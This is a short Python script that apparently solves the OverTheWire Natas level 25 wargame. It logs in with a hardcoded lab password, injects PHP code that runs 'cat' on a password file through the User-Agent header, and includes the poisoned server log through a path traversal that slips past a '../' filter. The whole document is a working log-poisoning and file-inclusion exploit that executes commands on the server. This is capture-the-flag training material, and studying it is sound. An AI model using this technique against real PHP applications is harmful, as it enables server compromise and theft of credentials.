#!/usr/bin python

import requests
from requests.auth import HTTPBasicAuth

password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
session = requests.Session()

auth = HTTPBasicAuth('natas25', password)
url = 'http://natas25.natas.labs.overthewire.org/index.php'
session.post(url=url, auth=auth)

headers = { "User-Agent": "<? passthru('cat /etc/natas_webpass/natas26'); ?>" }
id = session.cookies['PHPSESSID']

log = "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + id + ".log"
resp = session.post(url=url, headers=headers, data={"lang": log}, auth=auth)

print(resp.text)
